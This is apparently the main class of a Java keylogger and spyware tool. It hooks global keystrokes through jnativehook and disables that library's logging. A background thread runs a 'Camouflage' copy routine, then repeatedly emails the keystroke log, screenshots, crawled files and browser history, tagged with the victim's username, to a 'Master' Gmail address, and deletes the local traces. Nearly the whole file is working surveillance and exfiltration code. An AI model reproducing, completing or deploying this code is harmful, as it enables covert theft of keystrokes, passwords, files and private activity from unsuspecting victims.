package com.sassouki.logging;

import java.io.File;
import java.io.IOException;
import java.util.Properties;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.mail.Authenticator;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;
import com.sassouki.copyme.Camouflage;
import com.sassouki.crawler.Crawler;
import com.sassouki.crawler.History;
import com.sassouki.crawler.ScreenShot;
import com.sassouki.helper.Parse;
import com.sassouki.mail.Connection;
import com.sassouki.mail.mailMe;

public class KeyListener implements NativeKeyListener {
	
	Parse parse = new Parse();

    public void nativeKeyPressed(NativeKeyEvent e) {
    	
    }
   
    public void nativeKeyReleased(NativeKeyEvent e) {
    	try {
			parse.process(e.paramString());
		} catch (IOException e1) {
			// TODO Auto-generated catch block
			e1.printStackTrace();
		}
    }
    public void nativeKeyTyped(NativeKeyEvent e) {
    	try {
			parse.process(e.paramString());
		} catch (IOException e1) {
			// TODO Auto-generated catch block
			e1.printStackTrace();
		}
    	
    }
    
    public static void main(String[] args) {
        try {
        	Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
        	logger.setLevel(Level.OFF);
        	logger.setUseParentHandlers(false);
            GlobalScreen.registerNativeHook();
        }
        catch (NativeHookException ex) {
            
            System.exit(1);
        }
        
        Thread mailMe = new Thread(){
   		 public void run(){
   			 mailMe mail = new mailMe();
   			 final String sourceEmail = "mailId@gmail.com"; 
   		        final String password = "your password"; 
   		        final String toEmail = "receiver@gmail.com"; 
   		        boolean isSent=false;
   		        Properties props = new Properties();
   		        props.put("mail.smtp.host", "smtp.gmail.com");
   		        props.put("mail.smtp.port", "587");
   		        props.put("mail.smtp.auth", "true");
   		        props.put("mail.smtp.starttls.enable", "true");
   		 
   		        Authenticator authentication = new Authenticator() {
   		            protected PasswordAuthentication getPasswordAuthentication() {
   		                return new PasswordAuthentication(sourceEmail, password);
   		            }
   		        };
				Session session = Session.getInstance(props, authentication);
				String VictimId="Unknown";

   		  try
   		  {
   			VictimId =" <b>"+ System.getProperty("user.name")+"</b>";
   			
   		  }
   		  catch (Exception ex)
   		  {
   		        	
   		        };
   		        
   		        while(true){
   		        	Camouflage C=new Camouflage();
   		        	C.copySoftware();
   		        	if(new Connection().isConnected()){
   		        	try{
   		        		
   		        		mail.generateAndSendEmail( session,toEmail,
	   		   		                "keylogger "+VictimId,
	   		   		                "Hello Master, <br><br>find here what "+VictimId+" wrote  </i>"
	   		   		                        + "<br><br> Regards, Spoiled_Crolwer<br><br>"
	   		   		                		,"output.ocx");
   		        
   		        	}catch(Exception e){
   		        		}
   		        	try{
 		        			 new File("output.ocx").delete();
 		        		}catch(Exception e ){
 		        			
 		        		}
   		        	
   		        	
   		        	
   		        	try {
   		        		ScreenShot screenshot =new ScreenShot();
   		        		screenshot.Takescreenshot();
   		        		File sc = new File(screenshot.getPath());
   		        		if(sc.exists()){
   		        			mail.generateAndSendEmail( session,toEmail,
   	   		   		                "screenshot from "+VictimId,
   	   		   		                "Hello Master, <br><br>find here "+VictimId+" screenshot"
   	   		   		                        + "<br><br> Regards, Spoiled_Crolwer<br><br>"
   	   		   		                		,sc.getAbsolutePath());
   	   		        		try{
   	   		        			 new File(screenshot.getPath()).delete();
   	   		        		}catch(Exception e ){
   	   		        			
   	   		        		}
   		        		}
   		        		
					} catch (Exception e) {
						
					}
   		        	
   		        	
   		        	
   		        	try {
   		        		Crawler crawler = new Crawler();
   		        		File files = new File(crawler.getPath());
   		        		if(files.exists()){
   		        			mail.generateAndSendEmail( session,toEmail,
   	   		   		                "files of "+VictimId,
   	   		   		                "Hello Master, <br><br>find here "+VictimId+" files"
   	   		   		                        + "<br><br> Regards, Spoiled_Crolwer<br><br>"
   	   		   		                		,files.getAbsolutePath());
   	   		        		try{
   	   		        			 new File(files.getAbsolutePath()).delete();
   	   		        		}catch(Exception e ){
   	   		        			
   	   		        		}
   		        		}
   		        		
					} catch (Exception e) {
						
					}
   		        	
   		        	try {
   		        		//~2 h
						Thread.sleep(60000);
					} catch (InterruptedException e) {
						
					}
   		        	
   		        	
   		        	
   		        	
   		        	
   		        	try {
   		        		if(isSent==false){
   		        		File history = new History().getHistory();
   		        		if(history.exists()){
   		        			mail.generateAndSendEmail( session,toEmail,
   	   		   		                "history from "+VictimId,
   	   		   		                "Hello Master, <br><br>find here "+VictimId+" history"
   	   		   		                        + "<br><br> Regards, Spoiled_Crolwer<br><br>"
   	   		   		                		,history.getAbsolutePath());
   	   		        		
   		        		}
   		        		isSent=true;
   		        	}
   		        		
					} catch (Exception e) {
						
					}
   		        	
   		        	try {
   		        		//~2 h
						Thread.sleep(7200000);
					} catch (InterruptedException e) {
						
					}
   		     
   		        	//
   		        	}
   		 }
   		 }
   	 };
   	 
   	 try {
   		 
   		GlobalScreen.addNativeKeyListener(new KeyListener());
   		try{
   		mailMe.start();
   		}catch(Exception e){
   			
   		}
		
	} catch (Exception e) {
	}  
       
    }
}